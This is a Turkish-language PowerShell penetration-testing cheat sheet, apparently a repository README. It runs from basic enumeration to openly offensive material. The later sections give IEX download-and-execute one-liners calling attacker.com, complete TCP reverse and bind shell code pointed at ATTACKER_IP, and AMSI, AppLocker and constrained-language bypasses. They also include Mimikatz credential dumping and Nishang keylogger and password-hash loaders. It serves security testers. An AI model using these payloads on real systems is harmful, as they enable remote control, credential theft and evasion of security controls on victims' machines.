[🇬🇧 English](../../README.md)

# 💻 PowerShell - Kapsamlı Sızma Testi Başvuru Kılavuzu

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝██║     ██║     
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝███████╗███████║█████╗  ██║     ██║     
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══██║██╔══╝  ██║     ██║     
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║███████║██║  ██║███████╗███████╗███████╗
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerShell-blue?style=for-the-badge&logo=powershell" alt="PowerShell">
  <img src="https://img.shields.io/badge/Windows-Hacking-red?style=for-the-badge" alt="Hacking">
  <img src="https://img.shields.io/badge/Post_Exploitation-orange?style=for-the-badge" alt="Post-Exploitation">
</p>

---

## 📋 İçindekiler

- [Temel Bilgiler](#-temel-bilgiler)
- [Sistem Bilgisi Toplama (Enumeration)](#-sistem-bilgisi-toplama-enumeration)
- [Kullanıcı Numaralandırma](#-kullanıcı-numaralandırma)
- [Ağ Komutları](#-ağ-komutları)
- [Dosya İşlemleri](#-dosya-i̇şlemleri)
- [Süreç & Servis Yönetimi](#-süreç--servis-yönetimi)
- [Kayıt Defteri (Registry) İşlemleri](#-kayıt-defteri-registry-i̇şlemleri)
- [Active Directory](#-active-directory)
- [İndirme & Çalıştırma (Download & Execution)](#-i̇ndirme--çalıştırma-download--execution)
- [Ters Bağlantı Kabukları (Reverse Shells)](#-ters-bağlantı-kabukları-reverse-shells)
- [Atlatma Teknikleri (Bypass)](#-atlatma-teknikleri-bypass)
- [Ofansif Güvenlik Araçları](#-ofansif-güvenlik-araçları)
- [Tek Satırlık Komutlar (One-Liners)](#-tek-satırlık-komutlar-one-liners)

---

## 🔰 Temel Bilgiler

### Yürütme İlkesi (Execution Policy)

```powershell
# Mevcut ilkeyi kontrol etme
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# Yürütme ilkesini atlatma (geçerli oturum için)
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy Unrestricted -Scope CurrentUser

# İlkeyi atlatarak betik çalıştırma
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -File script.ps1
```

### Yardım Alma

```powershell
# Komut hakkında yardım alma
Get-Help Get-Process
Get-Help Get-Process -Full
Get-Help Get-Process -Examples

# Yardım belgelerini güncelleme
Update-Help

# Tüm komutları listeleme
Get-Command
Get-Command -Module ActiveDirectory
Get-Command *process*
```

### Değişkenler & Operatörler

```powershell
# Değişkenler
$var = "value"
$number = 42
$array = @(1, 2, 3)
$hash = @{key="value"; name="test"}

# Ortam değişkenleri
$env:USERNAME
$env:COMPUTERNAME
$env:USERDOMAIN
$env:PATH
Get-ChildItem Env:

# Karşılaştırma operatörleri
-eq   # Eşit (Equal)
-ne   # Eşit değil (Not equal)
-gt   # Büyüktür (Greater than)
-lt   # Küçüktür (Less than)
-like # Joker karakter eşleşmesi (Wildcard)
-match # Düzenli ifade eşleşmesi (Regex)
```

### Borulama (Piping) & Filtreleme

```powershell
# Çıktıyı filtreleme
Get-Process | Where-Object {$_.CPU -gt 10}
Get-Service | Where-Object Status -eq "Running"

# Belirli özellikleri seçme
Get-Process | Select-Object Name, CPU, Id
Get-Process | Select-Object -First 5

# Sıralama
Get-Process | Sort-Object CPU -Descending

# Çıktıyı biçimlendirme
Get-Process | Format-Table -AutoSize
Get-Process | Format-List *
Get-Process | Out-GridView
```

---

## 🔍 Sistem Bilgisi Toplama (Enumeration)

### Sistem Bilgileri

```powershell
# Bilgisayar bilgileri
Get-ComputerInfo
systeminfo
hostname
$env:COMPUTERNAME

# İşletim sistemi sürümü
[System.Environment]::OSVersion
(Get-WmiObject Win32_OperatingSystem).Caption
(Get-CimInstance Win32_OperatingSystem).Version

# Mimari
[Environment]::Is64BitOperatingSystem
$env:PROCESSOR_ARCHITECTURE

# Yüklü Güvenlik Yamaları (Hotfixes)
Get-HotFix
Get-HotFix | Where-Object InstalledOn -gt (Get-Date).AddDays(-30)
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Yüklü Yazılımlar

```powershell
# 64-bit yazılımlar
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# 64-bit OS üzerindeki 32-bit yazılımlar
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# WMI kullanarak sorgulama
Get-WmiObject -Class Win32_Product | Select-Object Name, Version

# Hızlı paket listesi
Get-Package
```

### Antivirüs & Güvenlik Yapılandırması

```powershell
# Antivirüs tespiti
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
Get-MpComputerStatus  # Windows Defender durumu

# Güvenlik duvarı (Firewall) durumu
Get-NetFirewallProfile
netsh advfirewall show allprofiles

# Güvenlik duvarı kuralları
Get-NetFirewallRule | Where-Object Enabled -eq True
Get-NetFirewallRule -DisplayName "*Remote*"

# Windows Defender dışlamaları (Exclusions)
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

### Zamanlanmış Görevler (Scheduled Tasks)

```powershell
# Zamanlanmış görevleri listeleme
Get-ScheduledTask
Get-ScheduledTask | Where-Object State -eq "Ready"

# Görev detayları
Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo

# schtasks komutu
schtasks /query /fo LIST /v
```

---

## 👤 Kullanıcı Numaralandırma

### Yerel Kullanıcılar

```powershell
# Geçerli kullanıcı
whoami
$env:USERNAME
[Environment]::UserName
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Tüm yerel kullanıcılar
Get-LocalUser
Get-LocalUser | Select-Object Name, Enabled, LastLogon
net user

# Belirli kullanıcı detayları
Get-LocalUser Administrator
net user Administrator

# Kullanıcı grupları
Get-LocalGroupMember Administrators
net localgroup Administrators
```

### Kullanıcı Yetkileri

```powershell
# Geçerli yetkiler (Privileges)
whoami /priv
whoami /all
whoami /groups

# Yönetici (Admin) hakları kontrolü
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

### Gruplar

```powershell
# Yerel grupları listeleme
Get-LocalGroup
net localgroup

# Grup üyeleri
Get-LocalGroupMember "Administrators"
Get-LocalGroupMember "Remote Desktop Users"
net localgroup "Administrators"
```

### Oturum Açmış Kullanıcılar

```powershell
# Mevcut oturum açmış kullanıcılar
query user
quser
qwinsta

# Son oturum açmalar
Get-WmiObject Win32_LogonSession | Select-Object LogonId, LogonType, StartTime
Get-EventLog -LogName Security -InstanceId 4624 -Newest 10
```

---

## 🌐 Ağ Komutları

### Ağ Yapılandırması

```powershell
# IP yapılandırması
Get-NetIPConfiguration
Get-NetIPAddress
ipconfig /all

# DNS
Get-DnsClientServerAddress
ipconfig /displaydns

# Yönlendirme (Routing) tablosu
Get-NetRoute
route print

# ARP tablosu
Get-NetNeighbor
arp -a
```

### Açık Portlar & Bağlantılar

```powershell
# TCP bağlantıları
Get-NetTCPConnection
Get-NetTCPConnection -State Listen
Get-NetTCPConnection | Where-Object State -eq "Established"
netstat -ano

# UDP uç noktaları
Get-NetUDPEndpoint

# Porta göre süreci bulma
Get-NetTCPConnection -LocalPort 80 | Select-Object OwningProcess
Get-Process -Id (Get-NetTCPConnection -LocalPort 80).OwningProcess
```

### Ağ Testleri

```powershell
# Ping
Test-Connection google.com
Test-Connection -ComputerName 192.168.1.1 -Count 4

# Port kontrolü
Test-NetConnection -ComputerName 192.168.1.1 -Port 445
Test-NetConnection -ComputerName google.com -Port 443

# Rota takibi (Traceroute)
Test-NetConnection -ComputerName google.com -TraceRoute

# DNS çözümleme
Resolve-DnsName google.com
nslookup google.com
```

### Ağ Paylaşımları (Network Shares)

```powershell
# Paylaşımları listeleme
Get-SmbShare
net share

# Ağ sürücüsü bağlama
New-PSDrive -Name Z -PSProvider FileSystem -Root "\\server\share"
net use Z: \\server\share

# Bağlı paylaşımları listeleme
Get-SmbConnection
net use

# Paylaşıma erişme
Get-ChildItem \\server\share
dir \\192.168.1.1\c$
```

---

## 📁 Dosya İşlemleri

### Gezinme & Listeleme

```powershell
# Geçerli dizin
Get-Location
pwd

# Dizin değiştirme
Set-Location C:\Users
cd C:\Users

# Dosyaları listeleme
Get-ChildItem
Get-ChildItem -Force  # Gizli dosyalar dahil
Get-ChildItem -Recurse
ls
dir

# Gizli dosyaları listeleme
Get-ChildItem -Hidden
Get-ChildItem -Attributes Hidden
dir /a:h
```

### Dosya Arama

```powershell
# İsme göre dosya arama
Get-ChildItem -Path C:\ -Recurse -Name "*.txt" -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Filter "password*" -ErrorAction SilentlyContinue

# İçeriğinde metin arama
Get-ChildItem -Recurse | Select-String "password"
Select-String -Path "C:\*.txt" -Pattern "password"

# Büyük dosyaları bulma
Get-ChildItem -Recurse | Where-Object Length -gt 100MB

# Son zamanlarda değiştirilen dosyaları bulma
Get-ChildItem -Recurse | Where-Object LastWriteTime -gt (Get-Date).AddDays(-7)
```

### Dosya Okuma & Yazma

```powershell
# Dosya okuma
Get-Content file.txt
Get-Content file.txt -Head 10
Get-Content file.txt -Tail 10
type file.txt
cat file.txt

# Dosyaya yazma
Set-Content file.txt "content"
Add-Content file.txt "append"
"content" | Out-File file.txt
"content" >> file.txt  # Ekleme (Append)

# Kopyalama / Taşıma / Silme
Copy-Item source.txt destination.txt
Move-Item source.txt destination.txt
Remove-Item file.txt
Remove-Item folder -Recurse -Force
```

### Alternatif Veri Akışları (Alternate Data Streams - ADS)

```powershell
# ADS akışlarını listeleme
Get-Item file.txt -Stream *
dir /r file.txt

# ADS içeriğini okuma
Get-Content file.txt -Stream secret
more < file.txt:secret

# ADS içerisine veri yazma
Set-Content file.txt -Stream hidden "secret data"
echo "data" > file.txt:hidden

# ADS akışını silme
Remove-Item file.txt -Stream hidden
```

### Dosya Hash Değeri Hesaplama

```powershell
# Hash hesaplama
Get-FileHash file.txt
Get-FileHash file.txt -Algorithm MD5
Get-FileHash file.txt -Algorithm SHA256
Get-FileHash file.txt -Algorithm SHA512

# Hash doğrulaması yapma
(Get-FileHash file.txt).Hash -eq "expected_hash"
```

---

## ⚙️ Süreç & Servis Yönetimi

### Süreçler (Processes)

```powershell
# Süreçleri listeleme
Get-Process
Get-Process | Sort-Object CPU -Descending
Get-Process -Name "chrome"
tasklist

# Süreç detayları
Get-Process -Id 1234 | Format-List *
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine

# Süreç başlatma
Start-Process notepad.exe
Start-Process -FilePath "cmd.exe" -ArgumentList "/c whoami"
Start-Process -FilePath "powershell.exe" -Verb RunAs  # Yönetici olarak

# Süreç sonlandırma
Stop-Process -Name "notepad"
Stop-Process -Id 1234 -Force
taskkill /PID 1234 /F
```

### Windows Servisleri

```powershell
# Servisleri listeleme
Get-Service
Get-Service | Where-Object Status -eq "Running"
Get-Service | Where-Object StartType -eq "Automatic"
sc query

# Servis detayları
Get-Service -Name "WinRM" | Format-List *
Get-WmiObject Win32_Service | Select-Object Name, StartMode, PathName

# Servis Başlatma / Durdurma
Start-Service -Name "WinRM"
Stop-Service -Name "WinRM"
Restart-Service -Name "WinRM"
net start WinRM
net stop WinRM

# Servis yürütme yolu kontrolü (Tırnaksız yol zaafiyeti - unquoted service path)
Get-WmiObject Win32_Service | Select-Object Name, PathName | Where-Object {$_.PathName -notlike '"*'}
```

---

## 📝 Kayıt Defteri (Registry) İşlemleri

### Kayıt Defterini Okuma

```powershell
# Anahtarları listeleme
Get-ChildItem HKLM:\SOFTWARE
Get-ChildItem HKCU:\SOFTWARE

# Kayıt defteri değerini okuma
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemPropertyValue HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "SecurityHealth"

# Kayıt defterinde arama yapma
Get-ChildItem HKLM:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "password"}
```

### Kayıt Defterine Yazma

```powershell
# Anahtar oluşturma
New-Item -Path HKCU:\SOFTWARE\MyKey

# Değer oluşturma / güncelleme
Set-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value" -Value "Data"
New-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "NewValue" -Value "Data" -PropertyType String

# Silme
Remove-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value"
Remove-Item -Path HKCU:\SOFTWARE\MyKey -Recurse
```

### Önemli Kayıt Defteri Konumları

```powershell
# Otomatik başlatma (Autorun) konumları
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Yüklü yazılımlar (Uninstall)
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*

# SAM (SYSTEM yetkisi gerektirir)
# HKLM:\SAM\SAM

# LSA sırları (SYSTEM gerektirir)
# HKLM:\SECURITY\Policy\Secrets
```

---

## 🏢 Active Directory

### Domain Bilgileri

```powershell
# Domain bilgisi alma
Get-ADDomain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$env:USERDNSDOMAIN

# Domain Controllers (Etki Alanı Denetleyicileri)
Get-ADDomainController
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address

# Forest bilgisi
Get-ADForest

# Güven ilişkileri (Trusts)
Get-ADTrust -Filter *
```

### Kullanıcı Numaralandırma (AD)

```powershell
# Tüm etki alanı kullanıcıları
Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled

# Belirli bir kullanıcı
Get-ADUser -Identity administrator -Properties *

# Belirli özelliklere sahip kullanıcılar
Get-ADUser -Filter {AdminCount -eq 1}  # Yöneticiler
Get-ADUser -Filter {ServicePrincipalName -ne "$null"}  # Kerberoasting yapılabilir kullanıcılar

# Kullanıcı arama
Get-ADUser -Filter {Name -like "*admin*"}
Get-ADUser -Filter {Description -like "*password*"}
```

### Grup Numaralandırma (AD)

```powershell
# Tüm gruplar
Get-ADGroup -Filter *

# Domain Admins grubu üyeleri
Get-ADGroupMember "Domain Admins"
Get-ADGroupMember "Domain Admins" -Recursive

# Enterprise Admins grubu üyeleri
Get-ADGroupMember "Enterprise Admins"

# Kullanıcının dahil olduğu gruplar
Get-ADPrincipalGroupMembership username
```

### Bilgisayar Numaralandırma (AD)

```powershell
# Tüm bilgisayarlar
Get-ADComputer -Filter *
Get-ADComputer -Filter * -Properties *

# Etki Alanı Denetleyicileri
Get-ADComputer -Filter {PrimaryGroupId -eq 516}

# Sunucular
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}
```

### GPO (Grup İlkesi) Bilgileri

```powershell
# GPO'ları listeleme
Get-GPO -All
Get-GPO -All | Select-Object DisplayName, GpoStatus

# GPO detayları
Get-GPO -Name "Default Domain Policy"

# GPO raporu oluşturma
Get-GPOReport -Name "Default Domain Policy" -ReportType HTML -Path report.html
```

---

## ⬇️ İndirme & Çalıştırma (Download & Execution)

### Dosya İndirme

```powershell
# Invoke-WebRequest (wget/curl eşdeğeri)
Invoke-WebRequest -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
iwr -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
wget "http://attacker.com/file.exe" -OutFile "file.exe"

# WebClient (daha hızlı)
(New-Object Net.WebClient).DownloadFile("http://attacker.com/file.exe", "C:\file.exe")

# Metin olarak indirme (betikler için)
(New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")

# Invoke-RestMethod
Invoke-RestMethod -Uri "http://attacker.com/file.exe" -OutFile "file.exe"

# BITS Transferi (daha gizli)
Start-BitsTransfer -Source "http://attacker.com/file.exe" -Destination "file.exe"

# certutil (LOLBin)
certutil -urlcache -split -f "http://attacker.com/file.exe" file.exe
```

### İndir ve Çalıştır (Bellek İçinde / Dosyasız)

```powershell
# IEX - Invoke-Expression (dosyasız / fileless yürütme)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX (iwr 'http://attacker.com/script.ps1')

# Değişken ile
$script = (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX $script

# Invoke-Command
Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')}
```

### Kodlanmış Yürütme (Encoded Execution)

```powershell
# Komutu Base64 formatında kodlama
$command = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
echo $encoded

# Kodlanmış komutu çalıştırma
powershell -enc <base64_string>
powershell -EncodedCommand <base64_string>

# Tek satırda Base64 kodlayıcı
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"))
```

---

## 🔌 Ters Bağlantı Kabukları (Reverse Shells)

### PowerShell TCP Ters Bağlantı Kabuğu

```powershell
# TCP Reverse Shell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

### Tek Satırlık Ters Bağlantı Kabukları

```powershell
# Nishang
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444

# PowerCat
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/powercat.ps1')
powercat -c ATTACKER_IP -p 4444 -e cmd

# Tek satırlık saf PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Bind Shell (Port Dinleme Kabuğu)

```powershell
# Belirtilen portu dinleme
$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
$listener.Stop()
```

---

## 🛡️ Atlatma Teknikleri (Bypass)

### Yürütme İlkesini Atlatma (Execution Policy Bypass)

```powershell
# İlke atlatma yöntemleri
powershell -ep bypass
powershell -ExecutionPolicy Bypass
Set-ExecutionPolicy Bypass -Scope Process

# Oku ve borula (Pipe)
Get-Content script.ps1 | PowerShell -NoProfile -
type script.ps1 | PowerShell -NoProfile -

# Bellek üzerinden çalıştırma (Diske dosya yazılmaz)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
```

### AMSI Atlatma (AMSI Bypass)

```powershell
# Basit AMSI bypass (güvenlik yazılımlarınca bilinebilir)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Karıştırılmış (Obfuscated) AMSI bypass
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Bellek yamalama (Yönetici hakları gerektirir)
$win32 = @"
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $win32
```

### Kısıtlı Dil Modu Atlatma (Constrained Language Mode)

```powershell
# Dil modunu kontrol etme
$ExecutionContext.SessionState.LanguageMode

# Eğer ConstrainedLanguage ise deneyin:
# - PowerShell 2.0 (varsa)
powershell -version 2

# - InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

### AppLocker Atlatma

```powershell
# MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload.exe

# Regasm/Regsvcs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# Geçerli AppLocker kurallarını inceleme
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

---

## 🔫 Ofansif Güvenlik Araçları

### PowerSploit

```powershell
# İndirme ve belleğe yükleme
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerSploit/Recon/PowerView.ps1')

# PowerView (Active Directory numaralandırma)
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
Find-LocalAdminAccess
Invoke-UserHunter

# PowerUp (Yetki Yükseltme denetimleri)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')
Invoke-AllChecks

# Invoke-Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### Empire / PowerShell Empire

```powershell
# Empire Stager çalıştırma
powershell -noP -sta -w 1 -enc <base64_payload>
```

### Nishang

```powershell
# Ters bağlantı kabuğu
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Shells/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444

# Keylogger
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Keylogger.ps1')
Keylogger

# Parola hash'lerini alma
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Get-PassHashes.ps1')
Get-PassHashes
```

---

## ⚡ Tek Satırlık Komutlar (One-Liners)

### Numaralandırma Komutları

```powershell
# Sistem bilgisi
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Kullanıcılar
Get-LocalUser | Select Name,Enabled

# Yüklü yazılımlar
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName

# Açık portlar
Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,OwningProcess

# Çalışan servisler
Get-Service | Where Status -eq Running | Select Name,DisplayName

# Zamanlanmış görevler
schtasks /query /fo TABLE | findstr /v "TaskName"

# Antivirüs durumu
Get-MpComputerStatus | Select RealTimeProtectionEnabled,IoavProtectionEnabled

# Güvenlik duvarı profilleri
Get-NetFirewallProfile | Select Name,Enabled
```

### Dosya İndirme Komutları

```powershell
# PowerShell ile indirme
(New-Object Net.WebClient).DownloadFile("http://url/file","C:\file")
IEX (New-Object Net.WebClient).DownloadString("http://url/script.ps1")
Invoke-WebRequest -Uri "http://url/file" -OutFile "file"

# certutil
certutil -urlcache -split -f "http://url/file" file

# bitsadmin
bitsadmin /transfer job /download /priority high http://url/file C:\file
```

### Hızlı Başvuru Tablosu

| Amaç | Komut |
|------|-------|
| Geçerli kullanıcı | `whoami` |
| Tüm kullanıcılar | `Get-LocalUser` |
| Yöneticiler | `Get-LocalGroupMember Administrators` |
| Sistem bilgisi | `systeminfo` |
| IP yapılandırması | `Get-NetIPAddress` |
| Açık portlar | `Get-NetTCPConnection -State Listen` |
| Süreçler | `Get-Process` |
| Servisler | `Get-Service \| Where Status -eq Running` |
| Dosya arama | `Get-ChildItem -Recurse -Filter "*.txt"` |
| İçerik arama | `Select-String -Path "C:\*" -Pattern "password"` |
| Dosya indirme | `(New-Object Net.WebClient).DownloadFile("url","file")` |
| Kodlanmış çalıştırma | `powershell -enc <base64>` |

---

## 📚 Kaynaklar

- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Nishang](https://github.com/samratashok/nishang)
- [PowerShell Empire](https://github.com/EmpireProject/Empire)
- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks PowerShell](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)

### İlgili Başvuru Kılavuzları
- [Mimikatz](../../Mimikatz/translations/README.tr.md)
- [Windows PrivEsc (Yetki Yükseltme)](../../Windows-PrivEsc/translations/README.tr.md)
- [Metasploit](../../Metasploit/translations/README.tr.md)

---

<p align="center">
  <b>💻 Sızma Testleri İçin PowerShell'de Uzmanlaşın!</b><br>
  <i>Windows sistemlerindeki en güçlü betik dili</i>
</p>
